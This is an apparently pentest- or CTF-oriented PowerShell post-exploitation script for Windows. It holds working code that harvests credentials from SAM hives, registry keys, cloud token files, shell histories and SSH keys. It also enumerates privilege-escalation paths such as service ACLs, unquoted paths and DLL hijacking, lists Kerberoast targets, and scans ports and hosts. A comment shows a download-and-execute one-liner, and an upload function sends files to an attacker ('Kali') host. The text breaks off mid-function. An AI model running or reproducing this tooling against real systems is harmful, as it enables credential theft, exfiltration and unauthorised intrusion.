#PowerShell Auxiliar Environment
#
# iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
#

Add-Type  @"
  [System.FlagsAttribute]
  public enum ServiceAccessFlags : uint
  {
      QueryConfig = 1,
      ChangeConfig = 2,
      QueryStatus = 4,
      EnumerateDependents = 8,
      Start = 16,
      Stop = 32,
      PauseContinue = 64,
      Interrogate = 128,
      UserDefinedControl = 256,
      Delete = 65536,
      ReadControl = 131072,
      WriteDac = 262144,
      WriteOwner = 524288,
      Synchronize = 1048576,
      AccessSystemSecurity = 16777216,
      GenericAll = 268435456,
      GenericExecute = 536870912,
      GenericWrite = 1073741824,
      GenericRead = 2147483648
  }
"@

$IP_KALI="{IP_KALI}"

#------------------------------------------------------
#  * Available Functions *
#-------------------------------------------------------
function recon.help
 { 
    Banner
    Write-Host ''
    Write-Host '[*] Auxiliary Tools:'
    Write-Host '    - aux.upload [file]               : Upload files to HTTP server via POST'
    Write-Host '    - aux.download [file]             : Perform GET to retrieve files'
    Write-Host ''
    Write-Host '[*] Auxiliary Recon:'
    Write-Host '    - recon.ports                     : Internal ports enumeration'
    Write-Host '    - recon.shres                     : SMB shares'
    Write-Host '    - recon.services                  : Search for sensitive services files Ej: recon.services -Path "C:\xampp"'
    Write-Host '    - recon.recent                    : Recently used files'
    Write-Host '    - recon.certs                     : Certificates'
    Write-Host '    - recon.sticky                    : Sticky notes'
    Write-Host '    - recon.basics                    : Basic system information'
    Write-Host '    - recon.files                     : Sensitive file discovery'
    Write-Host '    - recon.registry                  : Registry reconnaissance'
    Write-Host '    - recon.unattend                  : Search for unattended files'
    Write-Host '    - recon.dateScan                  : Files modified between two dates'
    Write-Host '    - recon.dateLast                  : Files modified less than 15 minutes ago'
    Write-Host '    - recon.portscan <host> [1-1024]  : Perform port scanning'
    Write-Host '    - recon.pingscan 10.10.10.        : Perform ping scan of /24 subnet'
    Write-Host '    - recon.pspy                      : Similar to pspy script'
    Write-Host '    - recon.servInfo                  : Information abaut a server'
    Write-Host ''
    Write-Host '[*] General Recon:'
    Write-Host '    - recon.sys                       : System information'
    Write-Host '    - recon.users                     : User information'
    Write-Host '    - recon.programs                  : Program information'
    Write-Host '    - recon.protections               : Protection information'
    Write-Host '    - recon.process                   : Process information'
    Write-Host '    - recon.networks                  : Network information'
    Write-Host '    - recon.acl                       : File permission information'
    Write-Host ''
    Write-Host '[*] Privesc Recon:'
    Write-Host '    - priv.serv.acl                   : ACLs od services'
    Write-Host '    - priv.path.hijack                : Path hijacking'
    Write-Host '    - priv.schedtask                  : Scheduled tasks'
    Write-Host '    - priv.startup                    : Startup tasks'
    Write-Host '    - priv.installElev                : AlwaysInstallElevated privilege'
    Write-Host '    - priv.serv.dir                   : Service directory privilege'
    Write-Host '    - priv.serv.reg                   : Service registry privilege'
    Write-Host '    - priv.serv.unq                   : Unquoted service privilege'
    Write-Host '    - priv.cred.files                 : Known credential files privilege'
    Write-Host '    - priv.cred.history               : Credential history privilege'
    Write-Host '    - priv.owned.files                : File owner privilege'
    Write-Host '    - priv.search.fname               : Credential in file name privilege'
    Write-Host '    - priv.search.fcontent            : Credential in file content privilege'
    Write-Host '    - priv.search.sshkeys             : SSH file privilege'
    Write-Host '    - priv.search.register            : Credential in registry privilege'
    Write-Host '    - priv.search.events              : Credential in events (Admin.) privilege'
    Write-Host '    - priv.autorun                    : Scheduled tasks privilege'
    Write-Host ''

    Write-Host '[*] Logon sessions:'
    Write-Host '    - Get-LogonSessionProcesses        : Retrieve processes associated with logon sessions'
    Write-Host '    - Get-LogonSessionProc             : Shortcut for detailed logon session process info'
    Write-Host '    - Get-LogonSession                 : Retrieve active logon sessions'
    Write-Host ''

    Write-Host '[*] AD Recon:'
    Write-Host '    - ad.psremote                     : Remote PowerShell privilege'
    Write-Host '    - ad.computers                    : Domain computers privilege'
    Write-Host '    - ad.users                        : Domain users privilege'
    Write-Host '    - ad.user <user>                  : Information about a user'
    Write-Host '    - ad.listusers                    : List common names for bruteforce'
    Write-Host '    - ad.groups                       : Domain groups privilege'
    Write-Host '    - ad.group <group>                : Information about a group'
    Write-Host '    - ad.spn                          : Kerberoasting accounts'
    Write-Host '    - ad.asrep                        : AS-REP Roasting users privilege'
    Write-Host ''
    Write-Host ''
 }



#------------------------------------------
#  * Upload files by POST http *
#------------------------------------------
function aux.upload {
    param (
        [string]$file
    )

    # Check data is provided
    if (-not $file) {
        Write-Host ""
        Write-Host " [>] Upload file via POST to http server:"
        Write-Host "        aux.upload <file>"
        return
    }

    $filename = Split-Path $file -Leaf
    wget $IP_KALI -Method Post -InFile $file -Headers @{ 'Content-Disposition' = "attachment; filename=$filename" }  -UseBasicParsing
}


#------------------------------------------
#  * Download files via HTTP GET *
#------------------------------------------
function aux.download {
    param (
        [string]$file
    )
    # Check data is provided
    if (-not $file) {
        Write-Host ""
        Write-Host " [>] GET file from http server:"
        Write-Host "        aux.download <file>"
        return
    }
    wget "http://$IP_KALI/$file" -o $file
}

#--------------------------------------------------
#  * Search files modified within last 15 minutes *
#--------------------------------------------------
function recon.dateLast(){
    Get-ChildItem / -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge (Get-Date).AddMinutes(-15) } | Select LastWriteTime,FullName | Format-Table -AutoSize
}




function recon.basics(){
    param (
        [string]$startDate,
        [string]$endDate
    )

    $executioncontext.sessionstate.languagemode
    whoami /all
    cmdkey /list
    query user
    net share
    Get-PSDrive
}

function recon.shares(){
    Gwmi Win32_Share|%{"\\$($_|% P*e)\$($_.Name)"}
}



function recon.files(){

    gci -Path C:\Users\ -Include *.ini,*.txt,*.bat,*.cmd,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.yml,*.exe,*.ps1,*.cfg,*.json,*.sql,*.sqlite,*.sqlite3,*.db,*.mdb,*.accdb,*.ldf,*.mdf,*.bak,*.dat,*.nsf,*.dbf,*.log,*.crt,*.key,*.pem,*.pfx,*.pwd,*.rdp -File -Recurse -ErrorAction SilentlyContinue
    gci -Path C:\ -Include *.kdbx,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
    Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
    Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
    Get-Childitem C:\inetpub\logs\LogFiles\*
    Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
    
    Get-ChildItem -Path "C:\Users" -Recurse -Filter "ConsoleHost_history.txt" -ErrorAction SilentlyContinue | ForEach-Object { 
        Write-Host "Archivo encontrado en: $($_.FullName)" -ForegroundColor Green
        Get-Content $_.FullName
    }

}

function recon.services {
    param (
        [string]$Path
    )

    Get-ChildItem -Path $Path -Recurse -Force -ErrorAction SilentlyContinue -Include *.config,*.ini,*.json,*.xml,*.yml,*.env,*.sql,*.sqlite,*.sqlite3,*.db,*.mdb,*.accdb,*.ldf,*.mdf,*.bak,*.dat,*.nsf,*.dbf,*.log,*.crt,*.key,*.pem,*.pfx,*.pwd,*.rdp,*.ps1,*.bat,*.cmd,*.txt |
    ForEach-Object {
        [PSCustomObject]@{
            FilePath = $_.FullName
            Size     = $_.Length
            LastModified = $_.LastWriteTime
        }
    } | Format-Table -AutoSize
}


function recon.certs {

    gci cert:\currentuser\my -verbose
    net start | findstr /i cert
    certutil -catemplates

}


function recon.recent {
    # Define el directorio base de archivos recientes para todos los usuarios
    $recentFolders = Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue | 
                     ForEach-Object { Join-Path $_.FullName "AppData\Roaming\Microsoft\Windows\Recent" }

    # Verificar si se encontraron directorios válidos
    if (-Not $recentFolders) {
        Write-Host "No se encontraron carpetas de archivos recientes." -ForegroundColor Yellow
        return
    }

    # Procesar cada carpeta de archivos recientes
    foreach ($folder in $recentFolders) {
        if (Test-Path $folder) {
            Write-Host "`nBuscando en: $folder" -ForegroundColor Cyan

            # Buscar archivos recientes que puedan contener información sensible
            Get-ChildItem -Path $folder -Recurse -Force -ErrorAction SilentlyContinue -Include *.lnk,*.txt,*.doc,*.docx,*.xlsx,*.pdf,*.log,*.config,*.ini,*.sql |
            ForEach-Object {
                [PSCustomObject]@{
                    FilePath     = $_.FullName
                    FileName     = $_.Name
                    Size         = $_.Length
                    LastAccessed = $_.LastAccessTime
                }
            } | Format-Table -AutoSize
        }
    }
}



function recon.sticky {
    # Define el directorio base para Sticky Notes en todos los usuarios
    $stickyFolders = Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue | 
                     ForEach-Object { Join-Path $_.FullName "AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState" }

    # Verificar si se encontraron directorios válidos
    if (-Not $stickyFolders) {
        Write-Host "No se encontraron carpetas de Sticky Notes." -ForegroundColor Yellow
        return
    }

    # Procesar cada carpeta de Sticky Notes
    foreach ($folder in $stickyFolders) {
        if (Test-Path $folder) {
            Write-Host "`nAnalizando: $folder" -ForegroundColor Cyan

            # Buscar archivos relevantes en la carpeta
            Get-ChildItem -Path $folder -Recurse -Force -ErrorAction SilentlyContinue -Include *.sqlite,*.json,*.log,*.bak |
            ForEach-Object {
                Write-Host "`nContenido de: $($_.FullName)" -ForegroundColor Green

                # Analizar los archivos SQLite y otros relevantes
                if ($_.Extension -eq ".sqlite") {
                    Write-Host "Archivo SQLite encontrado: $($_.FullName)" -ForegroundColor Magenta
                } else {
                    Get-Content $_.FullName | Format-Hex
                }
            }
        }
    }
}








function recon.registry(){
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>$NUL
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    reg query "HKCU\Software\ORL\WinVNC3\Password"
    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password"
}

function recon.unattend(){
    Get-Childitem "C:\" -Include ("*unattend*","*sysprep*") -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
    Get-ChildItem -Path C:\ -Recurse -Include "sysprep.inf", "sysprep.xml", "unattended.xml", "unattend.xml", "unattend.txt" -ErrorAction SilentlyContinue
}


#------------------------------------------
#  * Internal ports *
#------------------------------------------

function recon.ports(){
    Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property LocalAddress, LocalPort, ProcessName
}

#------------------------------------------
#  * Insecure Service Executables *
#------------------------------------------

function priv.serv.exec(){

    get-ciminstance -ClassName win32_service | select Name,State,PathName | Where-Object {$_.State -like 'Running'}
}

#------------------------------------------
#  * Service bin path modificable *
#------------------------------------------

function priv.serv.acl(){

        param (
        [string]$name
    )
    
    Get-ServiceAcl -Name $name | select -expand Access
}


function priv.path.hijack(){

    $env:Path
}


function priv.schedtask(){

    Get-ScheduledTask | where {$_.principal.RunLevel -eq "Highest"} | Where-Object {$Null -ne $_.Actions.Execute} | ft TaskName,TaskPath,State
    Get-ScheduledTask -ErrorAction Ignore | where {$_.principal.RunLevel -eq "Highest"} | Where-Object {$Null -ne $_.Actions.Execute} | ForEach-Object { if(ModifiablePath $_.Actions.Execute){ $_ } }
}



function priv.startup(){

    Get-ChildItem -Path "C:\Users" | Where-Object { $_.PSIsContainer } | ForEach-Object {
    $user = $_.Name
    $startupPath = "C:\Users\$user\Start Menu\Programs\Startup"
    
    if (Test-Path $startupPath) {
        Write-Host "Contenido de $startupPath para el usuario $user"
        Get-ChildItem -Path $startupPath
    } else {
        Write-Host "No Start Up folder for $user."
    }
}

}



#------------------------------------------
#  * Search files between two dates *
#------------------------------------------
function recon.dateScan(){
    param (
        [string]$startDate,
        [string]$endDate
    )

    # Verify two dates are provided
    if (-not ($startDate -and $endDate)) {
        Write-Host ""
        Write-Host " [>] Report between two dates:"
        Write-Host "        recon.dateScan 2020-01-01 2020-02-01"
        return
    }

    # Convert start date string to DateTime object
    $startDateTime = [datetime]::ParseExact($startDate, "yyyy-MM-dd", $null)
    $endDateTime = $startDateTime.AddDays(1)

    while ($startDateTime -lt [datetime]::ParseExact($endDate, "yyyy-MM-dd", $null)) {
        Write-Host ""
        Write-Host "------------------------------------------------"
        Write-Host ("            {0} <-> {1}" -f $startDateTime.ToString("yyyy-MM-dd"), $endDateTime.ToString("yyyy-MM-dd"))
        Write-Host "------------------------------------------------"

        Get-ChildItem / -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $startDateTime -and $_.LastWriteTime -lt $endDateTime } | Select LastWriteTime,FullName | Format-Table -AutoSize

        # Add one more day
        $startDateTime = $endDateTime
        $endDateTime = $startDateTime.AddDays(1)
    }
}


#------------------------------------------
#  * Port Scanner *
#------------------------------------------
function recon.portscan(){
    param (
        [string]$ip,
        [string]$portRange = "1-1024"
    )

    # Verify host is provided
    if (-not $ip) {
        Write-Host ""
        Write-Host " [>] Port Scanner:"
        Write-Host "        recon.portscan <host> [1-1024]"
        return
    }

    $startPort, $endPort = $portRange.Split('-')

    $startPort..$endPort | ForEach-Object {
        if ((New-Object Net.Sockets.TcpClient).Connect("$ip", $_)) {
            Write-Host "     [>] Port $_ is open!"
        }
    }
}


#------------------------------------------
#  * Ping scan subnet /24 *
#------------------------------------------
function recon.pingscan(){
    param (
        [string]$ip
    )

    # Verify host is provided
    if (-not $ip) {
        Write-Host ""
        Write-Host " [>] Network ping scan:"
        Write-Host "        recon.pingscan 192.168.0."
        return
    }

    1..225 | % {"$ip$($_): $(Test-Connection -count 1 -comp $ip$($_) -quiet)"}
}



#------------------------------------------
#  * Info about a service *
#------------------------------------------
function recon.servInfo(){
    param (
        [string]$service
    )

    # Verify name is provided
    if (-not $service) {
        Write-Host ""
        Write-Host " [>] Information about a service:"
        Write-Host "        recon.servInfo <serviceName>"
        return
    }

    Get-WMIObject -Class win32_service |Where-Object { $_.Name -eq $service } | select *
}



#----------------------------------------------------------
# Recon Functions (Enumeration)
#----------------------------------------------------------

#Aux function to determine if a given path is manipulable by the current user
function ModifiablePath {param ([Parameter(Mandatory = $true)][String[]]$Paths);$Sids = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | Select-Object -ExpandProperty Value;$Sids += $UserIdentity.User.Value;ForEach($Path in $Paths){try{$Path=$Path.Replace('"', "");if (-Not(Test-Path -Path $Path -ErrorAction Stop)){$Path=Split-Path -Path $Path -Parent};if (Test-Path -Path $Path -ErrorAction Stop) {$FILE=Resolve-Path -Path $Path | Select-Object -ExpandProperty Path;Get-Acl -Path $Path | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {if($_.FileSystemRights){$Rights = $_.FileSystemRights.value__}else{$Rights = $_.RegistryRights.value__};if(@([uint32]'0x40000000',[uint32]'0x10000000',[uint32]'0x02000000',[uint32]'0x00080000',[uint32]'0x00040000',[uint32]'0x00000004',[uint32]'0x00000002') | Where-Object { $Rights -band $_ }){if ($Sids -contains $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExcludeProperty Value) {$Path}}}}}catch{$false}}}

#System information
function recon.sys(){

    Write-Host ''
    Write-Host " ##########################################"
    Write-Host "        System Information Recon"
    Write-Host " ##########################################"
    systeminfo

    Write-Host ''
    Write-Host " ##########################################"
    Write-Host "        Disk Information Recon"
    Write-Host " ##########################################"
    Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Root,Description

    Write-Host ''
    Write-Host " ##########################################"
    Write-Host "       Environment Information Recon"
    Write-Host " ##########################################"
    Get-ChildItem env: | Format-Table -Wrap
}

#Local user and group information
function recon.users(){

    Write-Host ''
    Write-Host " ##########################################"
    Write-Host "            Local System Users"
    Write-Host " ##########################################"
    Get-LocalUser | ft Name,Enabled,LastLogon

    Write-Host ''
    Write-Host " ##########################################"
    Write-Host "            Local System Groups"
    Write-Host " ##########################################"
    Get-LocalGroup
}

#Installed programs information
function recon.programs(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                 Installed Programs (files)"
    Write-Host " ##############################################################"
    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | sort LastWriteTime | ft Parent,Name,LastWriteTime

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                Installed Programs (registry)"
    Write-Host " ##############################################################"
    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                  Check if WSL is installed"
    Write-Host " ##############################################################"
    if (Test-Path "C:\Windows\System32\wsl.exe" -ErrorAction Continue){ dir C:\Windows\System32\wsl.exe }
    if (Test-Path "C:\Windows\System32\bash.exe" -ErrorAction Continue){dir C:\Windows\System32\bash.exe }
}

#Information about protections on the machine
function recon.protections(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                         UAC Protection"
    Write-Host " ##############################################################"
    $Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
    $ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
    $PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 

    $ConsentPromptBehaviorAdmin_Value = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue('ConsentPromptBehaviorAdmin') 
    $PromptOnSecureDesktop_Value = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").GetValue('PromptOnSecureDesktop')
    If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ 
        $UACLev = "Do not notify" 
    } 
    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ 
        $UACLev = "Notify when apps try to make changes to my computer (without prompting on the secure desktop)" 
    } 
    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ 
        $UACLev = "Notify when apps try to make changes to my computer (default)" 
    } 
    ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ 
        $UACLev = "Always notify" 
    } 
    Else{ 
        $UACLev = "Unknown" 
    }
    Write-Host ""
    Write-Host " [>] UAC Level: "$UACLev
    Write-Host ""

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                     Firewall Information"
    Write-Host " ##############################################################"
    netsh firewall show state
    netsh firewall show config

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                     Antivirus Information"
    Write-Host " ##############################################################"
    WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                         AppLocker"
    Write-Host " ##############################################################"
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
}


#Information about processes
function recon.process(){
    Get-Process | Where-Object { $_.ProcessName -notin @('System', 'svchost', 'explorer', 'csrss', 'wininit', 'winlogon', 'lsass') } | Group-Object ProcessName | ForEach-Object {
    $firstProcess = $_.Group[0]
    try {
        $executablePath = $firstProcess.Modules[0].FileName
    } catch {
        $executablePath = ''
    }
    [PSCustomObject]@{
        ProcessName = $firstProcess.ProcessName
        Id = $firstProcess.Id
        SI = $firstProcess.SI
        Path = $executablePath
    }
} | Format-Table -AutoSize
}


#Information about networks
function recon.networks(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                     Open TCP Ports"
    Write-Host " ##############################################################"
    Get-NetTCPConnection -State Listen | ForEach-Object {
        $processId = $_.OwningProcess
        $process = Get-Process -Id $processId
        $_ | Add-Member -MemberType NoteProperty -Name ProcessName -Value $process.ProcessName -PassThru
    } | Format-Table -Property LocalAddress, LocalPort, ProcessName -AutoSize

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                Network Interface Information"
    Write-Host " ##############################################################"
    Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                      Routing Information"
    Write-Host " ##############################################################"
    Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
}


#Information about ACL and file owner
function recon.acl {
    param (
        [string]$File
    )
    # Verify if file name is provided
    if (-not $File) {
        Write-Host ""
        Write-Host " [>] File Information access:"
        Write-Host "        recon.acl <file>"
        return
    }
    $result = Get-Acl $File
    Write-Host ""
    Write-Host "-----------------------------------"
    Write-Host "  Owner: " $result.Owner
    Write-Host "-----------------------------------"
    Write-Host $result.AccessToString
    Write-Host ""
}


#Services with lax directory permissions
function priv.serv.dir(){
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object { if(ModifiablePath (($_.pathname -split ".exe")[0]+".exe")){ $_ | select Name,State,PathName } }
}

#Services with lax registry permissions
function priv.serv.reg(){
    ls HKLM:\SYSTEM\CurrentControlSet\Services\ | ForEach-Object { if(ModifiablePath $_.PSPath){$_.PSPath}}
}

#Services with unquoted service path issue
function priv.serv.unq(){
    $vuln1 = Get-WmiObject -Class win32_service | Where-Object {$_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'}
    $vuln2 = Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode |
    Where-Object { 
        $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'
    } | Select-Object Name, DisplayName, StartMode, PathName

    $vuln = @($vuln1 + $vuln2)

    ForEach ($serv in $vuln) {$SplitPathArray = $serv.pathname.Split(' ');$ConcatPathArray = @();for ($i=0;$i -lt $SplitPathArray.Count; $i++) {$ConcatPathArray += $SplitPathArray[0..$i] -join ' '};if(ModifiablePath $ConcatPathArray){$serv | select Name,State,PathName}}
}

#Services potentially vulnerable to DLL hijacking
function priv.serv.dll(){
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object { if(ModifiablePath $_){ $_ } }
    Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*','C:\Windows\*' | ForEach-Object {try{if(ModifiablePath $_){ $_ }}catch{}}
}


#Files owned by the current user
function priv.owned.files(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                    Files owned by the user"
    Write-Host " ##############################################################"
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    Get-ChildItem -Path $PWD -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $acl = Get-Acl $_.FullName -ErrorAction SilentlyContinue
        }
        catch { }
        if ($acl -ne $null -and $acl.Owner -eq $currentUser) {
            dir $_.FullName
        }
    } | Sort-Object LastWriteTime | Format-Table LastWriteTime,FullName
}

#Files and locations of known common credentials
function priv.cred.files(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                     Credential Manager"
    Write-Host " ##############################################################"
    cmdkey /list

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                      Credential Autologon"
    Write-Host " ##############################################################"
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*" | ft

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                     SAM and SYSTEM files"
    Write-Host " ##############################################################"
    @("$env:systemroot\repair\SAM","$env:systemroot\repair\system","$env:systemroot\System32\config\RegBack\SAM","$env:systemroot\System32\config\SAM","$env:systemroot\System32\config\SYSTEM","$env:systemroot\System32\config\RegBack\system") | ForEach-Object {if(Test-Path $_ -ErrorAction SilentlyContinue){ dir $_ }} | sort LastWriteTime | ft FullName,LastWriteTime

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                  Known registries credentials"
    Write-Host " ##############################################################"
    @("HKLM:\SYSTEM\Current\ControlSet\Services\SNMP","HKCU:\Software\SimonTatham\PuTTY\Sessions","HKCU:\Software\SimonTatham\PuTTY\SshHostKeys\","HKCU:\Software\ORL\WinVNC3\Password","HKLM:\SOFTWARE\RealVNC\WinVNC4","HKCU:\Software\Microsoft\Terminal Server Client\Servers","HKCU:\Software\TightVNC\Server","HKCU:\Software\OpenSSH\Agent\Key") | ForEach-Object {if(Test-Path $_){Get-ItemProperty $_}} 

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                  Unattended installations"
    Write-Host " ##############################################################"
    Get-Childitem "C:\" -Include ("*unattend*","*sysprep*") -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")} | ForEach-Object {dir $_} | sort LastWriteTime | ft FullName,LastWriteTime

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                   Known credential files"
    Write-Host " ##############################################################"
    @("env:localappdata\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite", "env:SYSTEMDRIVE\pagefile.sys","env:WINDIR\debug\NetSetup.log","env:WINDIR\repair\software","env:WINDIR\repair\security","env:WINDIR\system32\config\AppEvent.Evt","env:WINDIR\system32\config\SecEvent.Evt","env:WINDIR\system32\config\default.sav","env:WINDIR\system32\config\security.sav","env:WINDIR\system32\config\software.sav","env:WINDIR\system32\config\system.sav","env:USERPROFILE\ntuser.dat","env:USERPROFILE\LocalS~1\Tempor~1\Content.IE5\index.dat","env:USERPROFILE\appdata\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings","env:USERPROFILE\.aws\credentials","env:USERPROFILE\AppData\Roaming\gcloud\credentials.db","env:USERPROFILE\AppData\Roaming\gcloud\legacy_credentials","env:USERPROFILE\AppData\Roaming\gcloud\access_tokens.db","env:USERPROFILE\.azure\accessTokens.json","env:USERPROFILE\.azure\azureProfile.json") | ForEach-Object {if(Test-Path $_){dir $_}} | sort LastWriteTime | ft FullName,LastWriteTime

}

#Show history of all possible users on the machine
function priv.cred.history(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                    PowerShell histories"
    Write-Host " ##############################################################"
    $perfiles = Get-WmiObject Win32_UserProfile | Where-Object { $_.Special -eq $false }
    foreach ($perfil in $perfiles) {
        $rutaCompleta = Join-Path $perfil.LocalPath 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt'
        if (Test-Path $rutaCompleta -PathType Leaf -ErrorAction SilentlyContinue) {
            Write-Host ''
            Write-Host '----------------------------------------------------------------------------------------------------------------------------'
            Write-Host "File found at: $rutaCompleta"
            Write-Host '----------------------------------------------------------------------------------------------------------------------------'
            cat $rutaCompleta
            Write-Host ''
            Write-Host ''
        }
    }

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                        Win+R histories"
    Write-Host " ##############################################################"
    foreach ($p in $property) {Write-Host "$((Get-Item "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"-ErrorAction SilentlyContinue).getValue($p))"}

}

#Search files by name that may contain credentials
function priv.search.fname(){
    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                    Files named password"
    Write-Host " ##############################################################"
    Get-Childitem -Include *passw*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '\.(exe|dll)$' } | sort LastWriteTime | ft LastWriteTime,FullName 
}

#Search files by content that may contain credentials
function priv.search.fcontent(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "               Files with 'passw' in content"
    Write-Host " ##############################################################"
    Get-ChildItem -Include *.xml,*.ini,*.txt,*.config,*.kdbx -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "passw" -ErrorAction SilentlyContinue | ForEach-Object {dir $_.path} | sort LastWriteTime | ft LastWriteTime,FullName
    
}

#Search for credentials in the registry
function priv.search.register(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "            Registry keys with 'passw' in name"
    Write-Host " ##############################################################"
    reg query HKLM /F "passw" /t REG_SZ /S /K

}


#Search for SSH keys
function priv.search.sshkeys(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                     Possible SSH keys"
    Write-Host " ##############################################################"
    Get-ChildItem -Path $Path -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern '^-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----' -ErrorAction SilentlyContinue | ForEach-Object {dir $_.path} | sort LastWriteTime | ft LastWriteTime,FullName

}

#Search for the word 'password' in event logs (requires administrative privileges)
function priv.search.events(){
     Get-EventLog -LogName Security | Where-Object { $_.Message -like "*password*" } | Format-Table -Property Message -wrap
}


#Search for potential autorun tasks within the system
function priv.autorun(){

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                   List of startup tasks "
    Write-Host " ##############################################################"
    Get-WmiObject Win32_StartupCommand | select Name, command, Location, User | fl

    Write-Host ''
    Write-Host " ##############################################################"
    Write-Host "                  Startup registry entries "
    Write-Host " ##############################################################"
